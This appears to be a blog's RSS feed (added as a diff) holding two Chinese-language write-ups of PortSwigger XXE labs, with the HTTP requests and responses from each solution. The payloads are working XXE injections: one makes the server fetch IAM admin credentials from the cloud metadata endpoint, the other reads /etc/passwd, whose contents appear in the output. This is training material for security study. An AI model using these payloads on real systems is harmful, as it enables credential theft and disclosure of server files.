@@ -1,0 +1,81 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Xxe on en1r0py</title><link>/tags/xxe/</link><description>Recent content in Xxe on en1r0py</description><generator>Hugo -- gohugo.io</generator><language>en</language><lastBuildDate>Sat, 04 Jan 2025 00:24:30 +0800</lastBuildDate><atom:link href="/tags/xxe/index.xml" rel="self" type="application/rss+xml"/><item><title>Lab: Exploiting XXE to perform SSRF attacks</title><link>/portswigger-posts/xxe-lab-exploiting-xxe-to-perform-ssrf/</link><pubDate>Sat, 04 Jan 2025 00:24:30 +0800</pubDate><guid>/portswigger-posts/xxe-lab-exploiting-xxe-to-perform-ssrf/</guid><description>Lab description Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: a&amp;#34; 服务器将a返回，判断包含XXE注入，构造以下请求体(定义外部实体xxe，并使用关键字SYSTEM发送请求至指定url，最后将结果输出在productId标签)，发送请求后即可解题 POST /product/stock HTTP/2 &amp;lt;!DOCTYPE test [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: { &amp;#34;Code&amp;#34; : &amp;#34;Success&amp;#34;, ... }&amp;#34;</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-exploiting-xxe-to-perform-ssrf-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击任意商品的&lt;code>View details&lt;/code>，进入详情页后点击最下方的&lt;code>Check stock&lt;/code>，对应请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试修改&lt;code>productId&lt;/code>为&lt;code>a&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID: a&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>服务器将&lt;code>a&lt;/code>返回，判断包含XXE注入，构造以下请求体(定义外部实体&lt;code>xxe&lt;/code>，并使用关键字&lt;code>SYSTEM&lt;/code>发送请求至指定url，最后将结果输出在&lt;code>productId&lt;/code>标签)，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!DOCTYPE test [
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;!ENTITY xxe SYSTEM &amp;#34;http://169.254.169.254/latest/meta-data/iam/security-credentials/admin&amp;#34;&amp;gt; ]&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID: {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Code&amp;#34; : &amp;#34;Success&amp;#34;,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item><item><title>Lab: Exploiting XXE using external entities to retrieve files</title><link>/portswigger-posts/xxe-lab-exploiting-xxe-to-retrieve-files/</link><pubDate>Fri, 03 Jan 2025 23:35:22 +0800</pubDate><guid>/portswigger-posts/xxe-lab-exploiting-xxe-to-retrieve-files/</guid><description>Lab description Solution 点击任意商品的View details，进入详情页后点击最下方的Check stock，对应请求为 POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; 尝试修改productId为a POST /product/stock HTTP/2 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: a&amp;#34; 服务器将a返回，判断包含XXE注入，构造以下请求体(定义外部实体xxe，并使用关键字SYSTEM获取文件/etc/passwd，最后将结果输出在productId标签)，发送请求后即可解题 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE root [ &amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; ]&amp;gt; &amp;lt;stockCheck&amp;gt; &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt; &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt; &amp;lt;/stockCheck&amp;gt; HTTP/2 400 Bad Request &amp;#34;Invalid product ID: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin</description><content>&lt;h2 id="lab-description">Lab description&lt;/h2>
+&lt;p>&lt;img alt="Lab description" src="/img/2025/xxe-lab-exploiting-xxe-to-retrieve-files-1.jpg">&lt;/p>
+&lt;h2 id="solution">Solution&lt;/h2>
+&lt;ol>
+&lt;li>点击任意商品的&lt;code>View details&lt;/code>，进入详情页后点击最下方的&lt;code>Check stock&lt;/code>，对应请求为
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;1&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>尝试修改&lt;code>productId&lt;/code>为&lt;code>a&lt;/code>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">POST&lt;/span> /product/stock &lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;productId&amp;gt;a&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID: a&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;li>服务器将&lt;code>a&lt;/code>返回，判断包含XXE注入，构造以下请求体(定义外部实体&lt;code>xxe&lt;/code>，并使用关键字&lt;code>SYSTEM&lt;/code>获取文件&lt;code>/etc/passwd&lt;/code>，最后将结果输出在&lt;code>productId&lt;/code>标签)，发送请求后即可解题
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;!DOCTYPE root [
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;!ENTITY xxe SYSTEM &amp;#34;file:///etc/passwd&amp;#34;&amp;gt; ]&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;productId&amp;gt;&amp;amp;xxe;&amp;lt;/productId&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010"> &amp;lt;storeId&amp;gt;1&amp;lt;/storeId&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#960050;background-color:#1e0010">&amp;lt;/stockCheck&amp;gt;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-http" data-lang="http">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">HTTP&lt;/span>&lt;span style="color:#f92672">/&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#ae81ff">400&lt;/span> &lt;span style="color:#a6e22e">Bad Request&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;#34;Invalid product ID: root:x:0:0:root:/root:/bin/bash
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
+&lt;/ol></content></item></channel></rss>
